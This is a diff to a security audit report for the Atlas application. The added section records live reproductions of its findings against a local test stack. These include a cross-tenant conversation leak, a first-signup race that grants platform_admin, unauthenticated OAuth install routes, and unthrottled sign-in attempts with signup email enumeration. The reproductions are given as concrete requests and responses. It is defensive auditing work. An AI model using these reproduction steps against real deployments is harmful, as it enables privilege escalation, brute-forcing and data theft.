@@ -173,7 +173,113 @@ undefined` and the callback saves an installation bound to no org.
 | F-10 | P3 | `session.expiresIn` is 7 days rolling; no default absolute timeout for admin-capable sessions | — | p3-pending |
 | F-11 | P3 | `bearer()` plugin active alongside `apiKey()` — revocation + rotation flow not documented | — | p3-pending |
 
-P0: none.
+P0: none (initial scoring — see Phase 1.5 for upgrades).
 P1: 2 (F-01, F-02).
 P2: 5 (F-03..F-07).
 P3: 4 (F-08..F-11) — held here for the cleanup tail.
+
+---
+
+## Phase 1.5 — Empirical validation
+
+**Status:** complete (2026-04-20)
+**Scope:** Live repro of P1 + select P2 findings against a locally-running Atlas stack (`bun run db:up` + API on :3001). The static audit scored each finding based on code reading alone; this phase attacks the actual endpoints to confirm severity.
+
+### F-01 — cross-tenant conversation leak ✅ confirmed
+
+Repro (after inserting a conversation into Org A with `share_mode='org'`):
+
+```
+== User A (Org A owner) creates shared conversation =>
+SHARE_TOKEN=probecb42a262b692eb38dac0eab4b6ec8558
+
+== Unauthenticated GET /api/public/conversations/$TOKEN
+HTTP 403 {"error":"auth_required", ...}
+
+== Signup User B (no org memberships)
+member count = 0
+
+== User B authenticated GET /api/public/conversations/$TOKEN
+HTTP 200
+{"title":"F-01 probe","shareMode":"org","messages":[{"role":"user",
+"content":"SECRET: Org-A Q2 revenue is 12M USD (do not leak)", ...}]}
+```
+
+User B was **not** a member of Org A, had `orgs=0` in the member table, and still received the full conversation body including the sensitive message content. Severity stays **P1**. Dashboard equivalent was not tested but already has the org-membership check in code.
+
+### F-02 — bootstrap platform_admin race ⬆ upgraded to **P0**
+
+Repro against a fresh deployment (DB wiped; `.env` temporarily stripped of `ATLAS_ADMIN_EMAIL`):
+
+```
+== Fresh deployment, users=0, ATLAS_ADMIN_EMAIL unset
+
+== Attacker: POST /api/auth/sign-up/email
+{"email":"attacker-d262a055@evil.invalid","password":"AttackerPassword123!"}
+
+== Response (200):
+{"token":"HNzdrWe0jYp0kugUwflvPQS9dBLbLlmP",
+ "user":{"role":"platform_admin","emailVerified":false, ...}}
+
+== DB state:
+ email                          | role           | emailVerified
+ attacker-d262a055@evil.invalid | platform_admin | f
+
+== Attacker's session on admin route:
+GET /api/v1/admin/overview → HTTP 200
+{"connections":1,"entities":3,"metrics":2,"glossaryTerms":0,"plugins":0}
+```
+
+Single unauthenticated HTTP request → platform_admin role, valid session cookie, full admin console access. Email is unverified (fake `.invalid` TLD). Matches the P0 criterion: "exploitable today with minimal skill (auth bypass, privilege escalation)". Severity upgrades from P1 → **P0**.
+
+### F-04 — install route auth gap ✅ confirmed at P2
+
+Repro against API booted with dummy Slack/Teams/Discord env vars:
+
+```
+== Unauthenticated GETs:
+/api/v1/slack/install   → HTTP 302  Location: slack.com/oauth/v2/authorize?...&state=<uuid>
+/api/v1/teams/install   → HTTP 302  Location: login.microsoftonline.com/.../adminconsent?...&state=<uuid>
+/api/v1/discord/install → HTTP 302  Location: discord.com/oauth2/authorize?...&state=<uuid>
+
+== oauth_state table after the three requests:
+ provider | org_id | alive
+----------+--------+-------
+ discord  | (NULL) | t
+ teams    | (NULL) | t
+ slack    | (NULL) | t
+```
+
+All three install routes accept unauthenticated requests and persist CSRF nonces with `org_id = NULL`. Matches the original P2 scoring.
+
+### F-06 — Better Auth signin rate limiting ⬆ upgraded to **P1**
+
+Repro against live API, targeting a real admin email with bad passwords:
+
+```
+== 100 sequential POST /api/auth/sign-in/email attempts
+   (email: admin@useatlas.dev, password: wrong-pw-1..100)
+
+Total 401: 100   Total 429: 0   Other: 0
+
+== Bonus: signup enumerates existing users
+POST /api/auth/sign-up/email {"email":"admin@useatlas.dev", ...}
+HTTP 422 {"message":"User already exists. Use another email.",
+          "code":"USER_ALREADY_EXISTS_USE_ANOTHER_EMAIL"}
+```
+
+No throttling whatsoever at any point during 100 sequential authentication failures from the same source. The 429 bucket remained empty. A `code: USER_ALREADY_EXISTS_USE_ANOTHER_EMAIL` response gives a reliable email-enumeration oracle. This is a live, exploitable gap — not "defense-in-depth". Upgrades from P2 → **P1**.
+
+### Severity summary after Phase 1.5
+
+| ID | Initial P | Post-repro P | Change |
+|---|---|---|---|
+| F-01 | P1 | P1 | confirmed |
+| F-02 | P1 | **P0** | ⬆ upgraded |
+| F-03 | P2 | P2 | not re-tested this pass |
+| F-04 | P2 | P2 | confirmed |
+| F-05 | P2 | P2 | inherits severity (F-02 already weaponizes the email-unverified path) |
+| F-06 | P2 | **P1** | ⬆ upgraded |
+| F-07 | P2 | P2 | not re-tested this pass |
+
+**New totals:** P0 = 1 (F-02), P1 = 2 (F-01, F-06), P2 = 4 (F-03, F-04, F-05, F-07), P3 = 4.
